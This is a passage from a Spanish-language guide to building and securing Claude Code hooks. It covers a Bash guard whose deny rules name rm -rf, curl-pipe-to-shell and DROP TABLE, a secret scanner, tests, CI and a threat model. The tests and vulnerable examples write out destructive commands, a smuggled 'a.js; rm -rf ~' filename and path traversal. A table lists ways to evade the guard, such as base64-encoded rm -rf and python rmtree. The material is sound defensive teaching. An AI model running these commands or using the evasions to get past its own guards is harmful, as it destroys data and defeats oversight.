// .claude/hooks/lib/hook-io.mjs
export const leerEvento = async () => {
  const partes = [];
  for await (const parte of process.stdin) partes.push(parte);
  const texto = Buffer.concat(partes).toString('utf8').trim();
  return texto ? JSON.parse(texto) : {};
};

export const permitir = () => process.exit(0);

export const bloquear = (motivo) => {
  process.stderr.write(`${motivo}\n`);
  process.exit(2);
};

export const responder = (salida) => {
  process.stdout.write(JSON.stringify(salida));
  process.exit(0);
};

export const decidirPreToolUse = (permissionDecision, permissionDecisionReason, extra = {}) =>
  responder({
    hookSpecificOutput: { hookEventName: 'PreToolUse', permissionDecision, permissionDecisionReason, ...extra },
  });

/** Ejecuta el hook con política de fallo explícita. */
export const ejecutarHook = async (logica, { failClosed = false } = {}) => {
  try {
    await logica(await leerEvento());
    permitir();
  } catch (error) {
    if (failClosed) bloquear(`Hook falló y la política es fail-closed: ${error.message}`);
    process.stderr.write(`[hook] error no bloqueante: ${error.message}\n`);
    process.exit(1);
  }
};
```

### 10.3 Guardián de Bash con reglas declarativas

```js
#!/usr/bin/env node
// .claude/hooks/guardian-bash.mjs
import { pathToFileURL } from 'node:url';
import { ejecutarHook, bloquear, decidirPreToolUse } from './lib/hook-io.mjs';

export const REGLAS = [
  { patron: /\brm\s+-(?:[a-z]*r[a-z]*f|[a-z]*f[a-z]*r)\b/i, accion: 'deny', motivo: 'rm -rf no está permitido.' },
  { patron: /\bgit\s+push\b.*\s(--force|-f)(\s|$)/, accion: 'deny', motivo: 'Usa --force-with-lease.' },
  { patron: /\bgit\s+reset\s+--hard\b/, accion: 'ask', motivo: 'git reset --hard descarta cambios: confirma.' },
  { patron: /\b(curl|wget)\b.*\|\s*(ba|z)?sh\b/, accion: 'deny', motivo: 'Ejecutar scripts remotos por pipe está prohibido.' },
  { patron: /\b(drop|truncate)\s+(table|database)\b/i, accion: 'deny', motivo: 'DDL destructivo bloqueado.' },
];

export const evaluarComando = (comando) =>
  REGLAS.find(({ patron }) => patron.test(comando)) ?? null;

// Solo actúa como hook si se invoca directamente (no al importarlo desde los tests)
const esEjecucionDirecta = import.meta.url === pathToFileURL(process.argv[1] ?? '').href;

if (esEjecucionDirecta) {
  await ejecutarHook(async (evento) => {
    const comando = evento.tool_input?.command ?? '';
    const regla = evaluarComando(comando);
    if (!regla) return;
    if (regla.accion === 'deny') bloquear(regla.motivo);
    decidirPreToolUse('ask', regla.motivo);
  }, { failClosed: true });
}
```

Registro:

```json
{
  "matcher": "Bash",
  "hooks": [
    { "type": "command", "command": "node \"$CLAUDE_PROJECT_DIR/.claude/hooks/guardian-bash.mjs\"", "timeout": 5 }
  ]
}
```

### 10.4 Escáner de secretos en lo que Claude escribe

```js
#!/usr/bin/env node
// .claude/hooks/escaner-secretos.mjs
import { ejecutarHook, bloquear } from './lib/hook-io.mjs';

const DETECTORES = [
  ['AWS Access Key', /AKIA[0-9A-Z]{16}/],
  ['Llave privada', /-----BEGIN [A-Z ]*PRIVATE KEY-----/],
  ['Token de GitHub', /gh[pousr]_[A-Za-z0-9]{36,}/],
  ['Cadena de conexión SQL con password', /(Password|Pwd)\s*=\s*[^;'"]{4,}/i],
  ['JWT', /eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/],
];

await ejecutarHook(async ({ tool_input: input = {} }) => {
  const contenido = input.content ?? input.new_string ?? '';
  const hallazgos = DETECTORES.filter(([, re]) => re.test(contenido)).map(([nombre]) => nombre);
  if (hallazgos.length) {
    bloquear(`Posible secreto en ${input.file_path}: ${hallazgos.join(', ')}. Usa variables de entorno o user-secrets.`);
  }
}, { failClosed: true });
```

---

# Nivel 4 — Experto: calidad, seguridad y operación

## 11. Verificación y pruebas de hooks

Un hook es **código de producción que se ejecuta cientos de veces por sesión** con permisos de tu usuario. Merece pruebas como cualquier otro código.

### Pirámide de verificación

```mermaid
flowchart TB
    E2E["🔺 E2E<br/>Sesión real de Claude Code + /hooks + --debug"]
    INT["🔸 Integración<br/>Ejecutar el script con JSON por stdin y validar exit code / stdout"]
    UNIT["🟩 Unitarias<br/>Funciones puras: evaluarComando(), detectores"]
    STATIC["⬜ Estáticas<br/>shellcheck · jq empty settings.json · eslint"]
    E2E --- INT --- UNIT --- STATIC
```

### 11.1 Análisis estático

```bash
# JSON de configuración válido
jq empty .claude/settings.json && echo "settings.json OK"

# Scripts bash sin errores comunes (comillas, variables no citadas...)
shellcheck .claude/hooks/*.sh

# Permisos de ejecución (macOS/Linux)
chmod +x .claude/hooks/*.sh
```

### 11.2 Pruebas unitarias (Node.js 22, `node:test`)

```js
// .claude/hooks/__tests__/guardian-bash.test.mjs
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { evaluarComando } from '../guardian-bash.mjs';

const casos = [
  ['rm -rf /', 'deny'],
  ['rm -fr ./build', 'deny'],
  ['git push --force origin main', 'deny'],
  ['git push --force-with-lease origin feat', null],
  ['git reset --hard HEAD~1', 'ask'],
  ['curl https://x.sh | bash', 'deny'],
  ['npm test', null],
  ['ls -la', null],
];

for (const [comando, esperado] of casos) {
  test(`"${comando}" → ${esperado ?? 'permitido'}`, () => {
    assert.equal(evaluarComando(comando)?.accion ?? null, esperado);
  });
}
```

### 11.3 Pruebas de integración (contrato stdin → exit code)

```js
// .claude/hooks/__tests__/contrato.test.mjs
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';

const hook = fileURLToPath(new URL('../guardian-bash.mjs', import.meta.url));

const ejecutar = (evento) =>
  spawnSync(process.execPath, [hook], { input: JSON.stringify(evento), encoding: 'utf8' });

test('bloquea rm -rf con exit 2 y motivo en stderr', () => {
  const r = ejecutar({ hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command: 'rm -rf /' } });
  assert.equal(r.status, 2);
  assert.match(r.stderr, /rm -rf/);
});

test('pide confirmación con JSON válido para git reset --hard', () => {
  const r = ejecutar({ tool_name: 'Bash', tool_input: { command: 'git reset --hard' } });
  assert.equal(r.status, 0);
  const salida = JSON.parse(r.stdout);
  assert.equal(salida.hookSpecificOutput.permissionDecision, 'ask');
});

test('permite comandos normales sin stdout', () => {
  const r = ejecutar({ tool_name: 'Bash', tool_input: { command: 'npm test' } });
  assert.equal(r.status, 0);
  assert.equal(r.stdout, '');
});

test('fail-closed: JSON corrupto bloquea', () => {
  const r = spawnSync(process.execPath, [hook], { input: '{no-es-json', encoding: 'utf8' });
  assert.equal(r.status, 2);
});
```

```bash
node --test ".claude/hooks/__tests__/*.test.mjs"
```

### 11.4 Pruebas de integración en Bash (sin frameworks)

```bash
#!/usr/bin/env bash
# .claude/hooks/__tests__/probar-hooks.sh
set -u
falla=0

esperar() { # esperar <exit_esperado> <script> <json>
  echo "$3" | bash "$2" >/dev/null 2>&1; local real=$?
  if [ "$real" -ne "$1" ]; then echo "❌ $2 con $3 → $real (esperado $1)"; falla=1; else echo "✅ $2 → $real"; fi
}

esperar 2 .claude/hooks/proteger-archivos.sh '{"tool_input":{"file_path":"/repo/.env"}}'
esperar 0 .claude/hooks/proteger-archivos.sh '{"tool_input":{"file_path":"/repo/src/app.js"}}'
esperar 2 .claude/hooks/proteger-archivos.sh '{"tool_input":{"file_path":"/repo/certs/server.key"}}'

exit $falla
```

### 11.5 Llévalo a CI

```yaml
# .github/workflows/hooks.yml
name: Validar hooks de Claude Code
on:
  pull_request:
    paths: ['.claude/**']
jobs:
  hooks:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 22 }
      - run: sudo apt-get install -y shellcheck jq
      - run: jq empty .claude/settings.json
      - run: shellcheck .claude/hooks/*.sh
      - run: node --test ".claude/hooks/__tests__/*.test.mjs"
      - run: bash .claude/hooks/__tests__/probar-hooks.sh
```

> [!TIP]
> Combina esto con **CODEOWNERS** sobre `.claude/` para que cualquier cambio a hooks requiera revisión de un responsable de seguridad o del tech lead.

---

## 12. Depuración y troubleshooting

### Herramientas

| Herramienta | Qué muestra |
|-------------|-------------|
| `/hooks` | Hooks activos, su origen (usuario, proyecto, plugin) y permite revisarlos/editarlos |
| `claude --debug` | Qué hooks coincidieron, comando ejecutado, exit code, stdout/stderr y tiempos |
| Modo transcript (`Ctrl+O`) | Salida de los hooks dentro de la conversación |
| Hook espía (`cat >> archivo`) | El JSON exacto que llega al hook |
| `stderr` + `exit 1` | Mensajes de depuración que no afectan el flujo |

### Flujo de diagnóstico

```mermaid
flowchart TD
    A([El hook no hace lo esperado]) --> B{¿Aparece en /hooks?}
    B -- No --> B1["Revisa: JSON válido (jq empty),<br/>archivo correcto, disableAllHooks,<br/>allowManagedHooksOnly, sesión reiniciada"]
    B -- Sí --> C{"¿Se ejecuta?<br/>(claude --debug)"}
    C -- No --> C1["Revisa el matcher:<br/>mayúsculas (Bash ≠ bash),<br/>regex, nombre MCP exacto,<br/>evento correcto"]
    C -- Sí --> D{¿Exit code correcto?}
    D -- No --> D1["Prueba manual:<br/>echo JSON | script; echo $?<br/>¿jq instalado? ¿ruta con espacios citada?"]
    D -- Sí --> E{¿Claude ve el mensaje?}
    E -- No --> E1["exit 2 → motivo en stderr<br/>exit 0 → JSON válido en stdout,<br/>sin prints de debug"]
    E -- Sí --> F([✅ Funciona])
```

### Tabla de problemas frecuentes

| Síntoma | Causa probable | Solución |
|---------|----------------|----------|
| El hook "bloquea" pero la acción ocurre | Usa `exit 1` | `exit 2` o JSON `deny` |
| `command not found: jq` en Windows | `jq` no está en el PATH de Git Bash | `winget install jqlang.jq` o usar Node.js |
| Falla con rutas con espacios | `$CLAUDE_PROJECT_DIR` sin comillas | `"\"$CLAUDE_PROJECT_DIR/...\""` |
| Claude entra en bucle sin terminar | `Stop` sin `stop_hook_active` | Ver [9.1](#91-quality-gate-en-stop-no-terminar-con-tests-en-rojo) |
| Cambié el hook y no aplica | Snapshot al iniciar la sesión | Revisar en `/hooks` o reiniciar la sesión |
| El JSON de salida se ignora | Texto extra en stdout (`echo` de debug) | Debug a `stderr` |
| La sesión se siente lenta | Hooks pesados en `PreToolUse` con matcher `*` | Acotar matcher, `async`, `timeout` |
| Funciona en Mac pero no en Windows | Finales de línea CRLF en `.sh` | `.gitattributes`: `*.sh text eol=lf` |

---

## 13. Seguridad: modelo de amenazas y buenas prácticas

> [!CAUTION]
> **Los hooks se ejecutan con TUS permisos de sistema, sin sandbox y sin pedir confirmación.** Un hook malicioso o mal escrito puede borrar archivos, exfiltrar credenciales o abrir una puerta trasera. Trátalos con el mismo rigor que un script de CI con acceso a producción.

### 13.1 Modelo de amenazas

```mermaid
flowchart LR
    subgraph Amenazas
        A1["📦 Repo clonado con<br/>.claude/settings.json malicioso"]
        A2["💉 Inyección vía tool_input<br/>(nombres de archivo, comandos)"]
        A3["🔑 Fuga de secretos<br/>(logs, webhooks HTTP)"]
        A4["🧩 Plugin de terceros<br/>con hooks ocultos"]
        A5["🚪 Bypass de reglas<br/>(regex incompletas)"]
        A6["⏱️ Hook lento / caído<br/>(fail-open no deseado)"]
    end
    subgraph Defensas
        D1["Confiar en el workspace solo tras revisar .claude/<br/>CODEOWNERS · revisión en /hooks"]
        D2["Citar variables · nunca eval · parsear con jq/JSON"]
        D3["Redactar antes de loguear · allowedEnvVars"]
        D4["Auditar plugins · allowManagedHooksOnly"]
        D5["Defensa en profundidad:<br/>permisos deny + hooks + sandbox"]
        D6["Política de fallo explícita<br/>fail-closed en guardas"]
    end
    A1 --> D1
    A2 --> D2
    A3 --> D3
    A4 --> D4
    A5 --> D5
    A6 --> D6
```

### 13.2 Inyección: el error más grave

El contenido de `tool_input` lo genera un LLM que puede haber leído contenido no confiable (un README, una página web, un issue). **Nunca lo trates como código.**

❌ **Vulnerable:**

```bash
archivo=$(jq -r '.tool_input.file_path')
eval "prettier --write $archivo"          # eval = ejecución arbitraria
sh -c "cat $archivo | wc -l"              # sin comillas: "a.js; rm -rf ~" se ejecuta
```

✅ **Seguro:**

```bash
archivo=$(jq -r '.tool_input.file_path // empty')
# 1) Validar que está dentro del proyecto (evita path traversal: ../../etc/passwd)
real=$(realpath -m -- "$archivo")
case "$real" in
  "$CLAUDE_PROJECT_DIR"/*) ;;
  *) echo "Ruta fuera del proyecto: $archivo" >&2; exit 2 ;;
esac
# 2) Usar siempre comillas y "--" para cortar opciones
npx --no-install prettier --write -- "$real"
```

En Node.js, usa `execFile`/`spawn` con **array de argumentos**, nunca `exec` con strings concatenados:

```js
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
const execFileAsync = promisify(execFile);

await execFileAsync('npx', ['--no-install', 'prettier', '--write', '--', archivo]); // ✅
// exec(`npx prettier --write ${archivo}`)                                        // ❌
```

### 13.3 Las regex de bloqueo son una red, no un muro

Un guardián basado en patrones **se puede evadir**:

| Intento de evasión | Ejemplo |
|--------------------|---------|
| Variables | `X=rm; $X -rf /` |
| Codificación | `echo cm0gLXJmIC8= \| base64 -d \| sh` |
| Otros intérpretes | `python -c "import shutil; shutil.rmtree('/')"` |
| Rutas absolutas | `/bin/rm -rf /` |
| Escapes | `r\m -rf /` |

**Conclusión:** usa hooks de bloqueo como **una capa** dentro de una defensa en profundidad:

```mermaid
flowchart TB
    L1["1️⃣ permissions.deny en settings.json<br/>(Bash(rm:*), Read(./.env))"] --> L2
    L2["2️⃣ Hooks PreToolUse<br/>(reglas contextuales, reescritura, auditoría)"] --> L3
    L3["3️⃣ Modo de permisos adecuado<br/>(evitar bypassPermissions fuera de contenedores)"] --> L4
    L4["4️⃣ Sandbox / contenedor / devcontainer<br/>(límite real del sistema)"] --> L5
    L5["5️⃣ Mínimo privilegio en credenciales<br/>(tokens de solo lectura, sin acceso a prod)"]
```

> [!TIP]
> Prefiere **listas de permitidos** (allowlist) sobre listas de bloqueados (denylist) cuando sea posible: es más fácil enumerar lo seguro (`npm test`, `dotnet build`) que todo lo peligroso.

### 13.4 Fail-open vs. fail-closed

¿Qué pasa si tu hook **falla** (excepción, timeout, `jq` ausente)?

| Política | Comportamiento | Cuándo usarla |
|----------|----------------|---------------|
| **Fail-open** (por defecto: error ≠ 2 no bloquea) | Si el hook falla, la acción continúa | Formateo, logging, notificaciones |
| **Fail-closed** (capturar error → `exit 2`) | Si el hook falla, se bloquea | Guardas de seguridad, escáner de secretos |

Ver `ejecutarHook(..., { failClosed: true })` en la [sección 10.2](#102-librería-compartida).

> [!WARNING]
> **Caso real detectado al verificar esta lectura:** en una máquina Windows sin `jq`, una primera versión de `proteger-archivos.sh` hacía `archivo=$(jq ...)` → `jq: command not found` → `$archivo` vacío → `exit 0`. Resultado: **el hook permitía editar `.env` sin ningún aviso**. Un hook de seguridad que falla en silencio es peor que no tenerlo, porque da falsa confianza. Por eso la versión de la receta 8.3 verifica `command -v jq` y el parseo, y bloquea con `exit 2` si algo falla. Aplica lo mismo a cualquier dependencia (`node`, `realpath`, `git`).

### 13.5 Repositorios no confiables

- Un `.claude/settings.json` en un repo clonado puede traer hooks. **Revisa la carpeta `.claude/` antes de confiar en el workspace** cuando Claude Code te lo pregunte.
- Los cambios a hooks hechos fuera de Claude Code durante una sesión **no se aplican** hasta revisarlos en `/hooks`: si ves ese aviso sin haber editado nada, investiga.
- Usa el evento `ConfigChange` para auditar (o bloquear) cambios de configuración en caliente.

### 13.6 Secretos y privacidad

- No escribas `tool_input` completo en logs sin **redactar**: puede contener contenidos de archivos `.env`.
- En hooks `http`, usa `allowedEnvVars` y HTTPS; no envíes el transcript a servicios externos sin aprobación.
- Guarda los logs de auditoría fuera del repo o en `.gitignore`.

```bash
# Redactar valores sensibles antes de guardar
jq -c '.tool_input |= (tostring | gsub("(?i)(password|token|secret|key)=[^&;\\s\"]+"; "\\1=***"))'
```

### 13.7 Checklist de seguridad para revisar un hook

- [ ] ¿Todas las variables están entre comillas? ¿Hay algún `eval`, `sh -c` o `exec` con strings?
- [ ] ¿Valida que las rutas estén dentro de `$CLAUDE_PROJECT_DIR`?
- [ ] ¿La política de fallo (open/closed) es la adecuada para su propósito?
- [ ] ¿Tiene `timeout` razonable?
- [ ] ¿Descarga o ejecuta código remoto? (debería ser **no**)
- [ ] ¿Escribe secretos en logs o los envía a la red?
- [ ] ¿Está en `.claude/settings.json` (versionado y revisado) o en un lugar oculto?
- [ ] ¿Tiene pruebas que cubran casos de evasión conocidos?

---

## 14. Rendimiento y diseño

| Principio | Práctica |
|-----------|----------|
| **Filtra temprano** | Matcher específico (`Edit\|Write`) en vez de `*`; dentro del script, `exit 0` en la primera línea si la extensión no aplica |
| **Rápido en el camino crítico** | `PreToolUse` se ejecuta antes de **cada** herramienta: objetivo < 100 ms |
| **Async para lo accesorio** | Logging, métricas y notificaciones con `"async": true` |
| **Trabajo incremental** | Lint/format solo del archivo editado, no de todo el repo |
| **Lo pesado, al final** | Tests completos en `Stop`, no en `PostToolUse` |
| **Contexto mínimo** | Lo que imprimes en `SessionStart`/`UserPromptSubmit` consume tokens en cada turno |
| **Un hook, una responsabilidad** | Más fácil de testear y depurar; encadena en un script solo si el orden importa |
| **Idempotencia** | Ejecutar el hook dos veces debe dar el mismo resultado (formateo, logs con id) |

### ¿En qué evento pongo mi automatización?

```mermaid
flowchart TD
    Q([¿Qué quiero automatizar?]) --> A{¿Impedir o modificar<br/>una acción antes de que ocurra?}
    A -- Sí --> PRE["PreToolUse<br/>(o PermissionRequest para aprobar/denegar diálogos)"]
    A -- No --> B{¿Reaccionar a una acción<br/>que ya ocurrió?}
    B -- Sí --> POST["PostToolUse / PostToolUseFailure"]
    B -- No --> C{¿Validar el resultado<br/>final de la tarea?}
    C -- Sí --> STOP["Stop / SubagentStop / TaskCompleted"]
    C -- No --> D{¿Preparar o enriquecer<br/>el contexto?}
    D -- "Al iniciar" --> SS["SessionStart"]
    D -- "En cada prompt" --> UPS["UserPromptSubmit"]
    D -- "Tras compactar" --> CMP["SessionStart (matcher compact)<br/>/ PostCompact"]
    D -- No --> E{¿Avisar al humano?}
    E -- Sí --> NOT["Notification / Stop"]
    E -- No --> END["SessionEnd (limpieza, reportes)"]
```

---

## 15. Proyecto integrador: un `.claude/` de equipo

Una configuración completa para un proyecto Node.js + .NET que combina todo lo anterior.

```
mi-proyecto/
├── .gitattributes                  # *.sh text eol=lf
├── .github/
│   ├── CODEOWNERS                  # /.claude/ @tech-lead
│   └── workflows/hooks.yml
└── .claude/
    ├── settings.json
    ├── contexto-critico.md
    └── hooks/
        ├── lib/hook-io.mjs
        ├── guardian-bash.mjs
        ├── escaner-secretos.mjs
        ├── proteger-archivos.sh
        ├── formatear.sh
        ├── contexto-inicial.sh
        ├── quality-gate.sh
        └── __tests__/
```

```json
{
  "permissions": {
    "deny": ["Read(./.env)", "Read(./.env.*)", "Bash(rm -rf:*)"]
  },
  "hooks": {
    "SessionStart": [
      {
        "matcher": "startup|resume",
        "hooks": [{ "type": "command", "command": "bash \"$CLAUDE_PROJECT_DIR/.claude/hooks/contexto-inicial.sh\"", "timeout": 10 }]
      },
      {
        "matcher": "compact",
        "hooks": [{ "type": "command", "command": "cat \"$CLAUDE_PROJECT_DIR/.claude/contexto-critico.md\"" }]
      }
    ],
    "UserPromptSubmit": [
      {
        "hooks": [{ "type": "command", "command": "bash \"$CLAUDE_PROJECT_DIR/.claude/hooks/detectar-secretos-prompt.sh\"", "timeout": 5 }]
      }
    ],
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [{ "type": "command", "command": "node \"$CLAUDE_PROJECT_DIR/.claude/hooks/guardian-bash.mjs\"", "timeout": 5 }]
      },
      {
        "matcher": "Edit|Write",
        "hooks": [
          { "type": "command", "command": "bash \"$CLAUDE_PROJECT_DIR/.claude/hooks/proteger-archivos.sh\"", "timeout": 5 },
          { "type": "command", "command": "node \"$CLAUDE_PROJECT_DIR/.claude/hooks/escaner-secretos.mjs\"", "timeout": 5 }
        ]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "Edit|Write",
        "hooks": [{ "type": "command", "command": "bash \"$CLAUDE_PROJECT_DIR/.claude/hooks/formatear.sh\"", "timeout": 30 }]
      },
      {
        "matcher": "*",
        "hooks": [{
          "type": "command",
          "command": "jq -c '{ts: (now|todate), sesion: .session_id, tool: .tool_name}' >> \"$CLAUDE_PROJECT_DIR/.claude/auditoria.jsonl\"",
          "async": true
        }]
      }
    ],
    "Stop": [
      {
        "hooks": [{ "type": "command", "command": "bash \"$CLAUDE_PROJECT_DIR/.claude/hooks/quality-gate.sh\"", "timeout": 300 }]
      }
    ],
    "Notification": [
      {
        "hooks": [{ "type": "command", "command": "bash \"$CLAUDE_PROJECT_DIR/.claude/hooks/notificar.sh\"", "async": true }]
      }
    ]
  }
}
```

### Cómo fluye una tarea con esta configuración

```mermaid
sequenceDiagram
    autonumber
    actor Dev
    participant CC as Claude Code
    participant G as Guardas (Pre)
    participant F as Formato/Auditoría (Post)
    participant Q as Quality gate (Stop)

    Dev->>CC: "Agrega validación de email en UserService"
    Note over CC: SessionStart ya inyectó rama, commits y TODOs
    CC->>G: Edit UserService.cs
    G-->>CC: ✅ no protegido, sin secretos
    CC->>F: PostToolUse → dotnet format + log
    CC->>G: Bash "dotnet test"
    G-->>CC: ✅ permitido
    CC->>Q: Stop
    Q-->>CC: ⛔ 2 tests fallan (exit 2 + salida)
    CC->>G: Edit UserServiceTests.cs
    CC->>Q: Stop (stop_hook_active=true)
    Q-->>CC: ✅ termina
    CC-->>Dev: Resumen + notificación de escritorio
```

---

## 16. Ejercicios y checklist final

### Ejercicios progresivos

| # | Nivel | Ejercicio | Pista |
|---|-------|-----------|-------|
| 1 | 🟢 | Hook que muestre un `systemMessage` "Sesión iniciada" en `SessionStart` | JSON con `systemMessage` |
| 2 | 🟢 | Notificación de escritorio en `Stop` | Receta 8.4, evento distinto |
| 3 | 🟡 | Bloquear `Write` de archivos de más de 500 líneas | `tool_input.content` + `wc -l` |
| 4 | 🟡 | Inyectar en cada prompt la fecha y la rama actual | `UserPromptSubmit` + `additionalContext` |
| 5 | 🟡 | Reescribir `npm install` → `npm ci` cuando existe `package-lock.json` | `updatedInput` + `ask` |
| 6 | 🔴 | Quality gate con máximo 3 reintentos por sesión | Contador por `session_id` |
| 7 | 🔴 | Escribir 10 casos de evasión para el guardián de Bash y cubrirlos con tests | `node --test` |
| 8 | 🔴 | Servicio HTTP de políticas con allowlist por equipo | Sección 9.7 |

### Checklist "listo para producción"

- [ ] El hook resuelve algo que **debe** pasar siempre (si no, va en `CLAUDE.md`).
- [ ] Evento y matcher son los **más específicos** posibles.
- [ ] Usa `"$CLAUDE_PROJECT_DIR"` entre comillas, nunca rutas relativas.
- [ ] Bloquea con `exit 2` + `stderr` **o** con JSON en `exit 0`, no ambos.
- [ ] `stdout` limpio: solo JSON o contexto intencional.
- [ ] Tiene `timeout` y, si es accesorio, `async: true`.
- [ ] Política de fallo explícita (fail-open / fail-closed).
- [ ] Hooks de `Stop` respetan `stop_hook_active`.
- [ ] Pruebas unitarias / de contrato y ejecución en CI.
- [ ] Revisado contra el checklist de seguridad (13.7).
- [ ] Funciona en los SO del equipo (LF, `jq`/Node disponibles).
- [ ] Documentado en el `CLAUDE.md` del proyecto (qué hace y por qué).

---

## 17. Resumen

```mermaid
mindmap
  root((Hooks))
    Fundamentos
      Deterministas vs CLAUDE.md
      Evento + Matcher + Handler
      Se acumulan entre niveles
    Contrato
      stdin JSON
      exit 0 / 2 / otro
      JSON de control
        permissionDecision
        decision block
        additionalContext
        updatedInput
    Ejecución
      Paralelo
      deny gana
      timeout / async
      Snapshot al iniciar
    Avanzado
      Quality gate en Stop
      Reescritura de inputs
      prompt / agent
      HTTP centralizado
      Skills y subagentes
    Experto
      Tests unitarios y de contrato
      CI + CODEOWNERS
      Debug con --debug y /hooks
      Seguridad
        Sin eval, comillas
        Defensa en profundidad
        Fail-closed en guardas
```

- Los hooks convierten a Claude Code en una **plataforma orientada a eventos**: tú defines políticas y automatizaciones que se cumplen **siempre**.
- Domina el **contrato**: JSON por stdin; `exit 0` (ok), `exit 2` (bloquear, motivo en stderr), o JSON estructurado para decisiones finas.
- Empieza por recetas simples (formatear, notificar, proteger archivos) y escala a **quality gates**, **reescritura de inputs** y **políticas centralizadas**.
- Trata los hooks como **código de producción**: pruebas, CI, revisión, timeouts y política de fallo.
- La seguridad es **defensa en profundidad**: hooks + `permissions.deny` + modo de permisos + sandbox. Un hook con regex es una red, no un muro.
